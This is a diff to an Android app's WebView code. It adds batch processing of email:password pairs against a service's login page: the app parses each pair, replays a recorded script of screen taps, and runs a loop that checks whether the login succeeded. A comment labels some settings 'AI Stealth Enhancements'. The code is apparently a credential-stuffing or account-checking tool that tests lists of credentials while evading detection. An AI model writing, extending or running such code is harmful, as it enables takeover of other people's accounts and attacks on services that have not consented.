@@ -1018,6 +1018,14 @@ private void setupWebView() {
         applyProxySettings();
         WebSettings webSettings = mWebView.getSettings();
 
+        mWebView.setOnTouchListener((v, event) -> {
+            if (recordingMode == RECORD_MODE_SUCCESS && isVisualMappingReady && event.getAction() == MotionEvent.ACTION_UP) {
+                handleVisualRecordingTap((int)event.getX(), (int)event.getY());
+                return true; // Consume event
+            }
+            return false;
+        });
+
         // AI Stealth Enhancements
         webSettings.setDomStorageEnabled(true);
         webSettings.setDatabaseEnabled(true);
@@ -1665,7 +1673,14 @@ private void setupWebView() {
         String currentPair = credentialList.get(currentCredentialIndex);
 
         updateTerminal("Processing: " + currentPair.split(":")[0]);
-        // tvDeckCount.setText((currentCredentialIndex + 1) + "/" + credentialList.size()); // Removed old UI
+
+        String[] parts = currentPair.split(":", 2);
+        currentBatchEmail = parts[0].trim();
+        if (parts.length > 1) {
+             currentBatchPassword = parts[1].trim();
+        } else {
+             currentBatchPassword = "";
+        }
 
         final int targetIndex = currentCredentialIndex;
 
@@ -1676,10 +1691,29 @@ private void setupWebView() {
             batchHandler.postDelayed(() -> {
                  if (!isBatchRunning || targetIndex != currentCredentialIndex) return;
                  isWaitingForNext = false;
-                 replayStartTime = System.currentTimeMillis();
-                 lastExecutedIndex = -1;
+                 isReplaying = true;
+
+                 // Load visual script
+                 pendingVisualActions.clear();
+                 currentVisualActionIndex = 0;
+                 try {
+                     JSONArray script = new JSONArray(currentService.getScriptJson());
+                     for (int i = 0; i < script.length(); i++) {
+                         pendingVisualActions.add(VisualAction.fromJson(script.getJSONObject(i)));
+                     }
+                     if (pendingVisualActions.isEmpty()) {
+                         updateTerminal("Warning: No visual actions found in script.");
+                     }
+                 } catch (Exception e) {
+                      updateTerminal("Error loading visual script: " + e.getMessage());
+                 }
 
                  mWebView.loadUrl(currentService.getLoginUrl());
+
+                 // Start visual action chain and start success checks
+                 mWebView.postDelayed(this::executeVisualAction, 3000);
+                 injectReplayer(); // starts the success verifier loop
+
             }, 1000);
         });
     }
@@ -1692,37 +1726,10 @@ private void setupWebView() {
 
     private void injectReplayer() {
         if (!isReplaying) return;
-        String js = readAssetFile("replayer.js");
         verificationAttempts = 0;
 
-        String email = "";
-        String pass = "";
-        if (isBatchRunning && currentCredentialIndex < credentialList.size()) {
-            String[] parts = credentialList.get(currentCredentialIndex).split(":", 2);
-            if (parts.length > 0) email = parts[0].trim();
-            if (parts.length > 1) pass = parts[1].trim();
-        }
-
-        JSONArray jsonArray = new JSONArray(currentSessionEvents);
-        JSONObject overrides = new JSONObject();
-        try {
-            overrides.put("email", email);
-            overrides.put("password", pass);
-        } catch (JSONException e) {}
-
-        String setup = "window.replayEvents = " + jsonArray.toString() + "; " +
-                       "window.replayStartTime = " + replayStartTime + "; " +
-                       "window.lastExecutedIndex = " + lastExecutedIndex + "; " +
-                       "var overrides = " + overrides.toString() + "; " +
-                       "window.overrideEmail = overrides.email; " +
-                       "window.overridePassword = overrides.password;" +
-                       "window.coordinateMode = " + useCoordinateMode + ";";
-
-        updateTerminal("Testing: " + email);
-        mWebView.evaluateJavascript(setup + js, null);
-
         final int targetIndex = currentCredentialIndex;
-        // Start verification
+        // Start verification loop for success checks
         verificationRunnable = () -> checkVerificationStatus(targetIndex);
         batchHandler.postDelayed(verificationRunnable, 2000);
     }
